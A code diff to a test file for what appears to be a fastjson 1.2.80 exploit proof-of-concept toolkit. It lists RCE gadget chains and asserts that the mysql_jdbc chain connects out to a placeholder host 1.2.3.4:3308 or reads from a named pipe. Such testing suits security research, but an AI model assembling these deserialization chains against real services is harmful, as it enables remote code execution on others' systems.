@@ -16,7 +16,7 @@ from fastjson_toolkit.poc.v1_2_80.payloads import (
 from fastjson_toolkit.poc.v1_2_80.service import generate_poc_1280
 
 
-def test_all_gadgets_are_file_write_rce():
+def test_all_gadgets_listed():
     gadgets = list_gadgets()
     ids = {g["id"] for g in gadgets}
     assert ids == {
@@ -29,6 +29,8 @@ def test_all_gadgets_are_file_write_rce():
         "aspectj_write",
     }
     for g in gadgets:
+        if g["id"] == "mysql_jdbc":
+            continue
         assert g["marker_file"].startswith("/tmp/fj1280_")
         assert g["marker_content"].startswith("FJ1280_")
 
@@ -67,10 +69,21 @@ def test_groovy_and_pg():
     assert "bean-postgresql.xml" in build_postgresql()
 
 
-def test_mysql_ends_with_write():
-    steps = build_steps("mysql_jdbc")
+def test_mysql_jdbc_outbound_and_pipe():
+    steps = build_steps("mysql_jdbc", host="1.2.3.4", port=3308)
+    assert len(steps) == 3
     assert "CompressedInputStream" in steps[2]
-    assert "LazyFileOutputStream" in steps[-1]
+    assert "JDBC4Connection" in steps[2]
+    assert "1.2.3.4" in steps[2]
+    assert "LazyFileOutputStream" not in steps[-1]
+    offline = build_steps(
+        "mysql_jdbc",
+        outbound=False,
+        named_pipe_path="/tmp/pipe.pcap",
+        host="xxx",
+    )
+    assert "NamedPipeSocketFactory" in offline[-1]
+    assert "/tmp/pipe.pcap" in offline[-1]
 
 
 def test_generate_service_notes_marker():
